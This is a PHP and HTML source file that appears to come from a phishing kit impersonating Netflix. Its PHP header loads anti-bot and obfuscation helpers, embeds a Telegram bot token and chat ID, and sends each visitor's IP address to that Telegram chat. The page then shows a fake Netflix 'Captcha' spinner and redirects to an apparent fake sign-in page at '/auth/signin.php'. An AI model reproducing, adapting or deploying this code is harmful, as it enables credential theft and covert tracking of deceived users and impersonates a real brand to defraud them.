
<?php
// Include additional PHP files
require (__DIR__).'/botMother/botMother.php';
require (__DIR__)."/lib/md.php";
require (__DIR__)."/lib/obf.php";

// Bot token and chat ID directly in the script
$bot = '7442817307:AAFYxD4tGSLj23SBKBEFOo6g69WBnLxUil4';
$chat_id = '-1002225821599';

// Function to get the IP address of the visitor
function getVisitorIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Function to send message to Telegram
function sendTelegramMessage($bot, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$bot/sendMessage";
    $post_fields = array(
        'chat_id' => $chat_id,
        'text' => $message
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $output = curl_exec($ch);
    curl_close($ch);

    return $output;
}

// Get the visitor's IP address
$visitor_ip = getVisitorIP();

// Send the notification with the IP addres
     sendTelegramMessage($bot, $chat_id, "Visitor IP: $visitor_ip");
?>     

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Captcha</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #141414;
            color: #ffffff;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            overflow: hidden;
        }

        .loading-container {
            text-align: center;
        }

        .logo {
            width: 150px;
            margin-bottom: 20px;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #e50914;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        // JavaScript for redirection after 5 seconds
        setTimeout(function() {
            window.location.href = "/auth/signin.php";
        }, 5000);
    </script>
</head>
<body>
    <div class="loading-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="logo">
        <div class="spinner"></div>
        <p>Please wait…</p>
    </div>
</body>
</html>
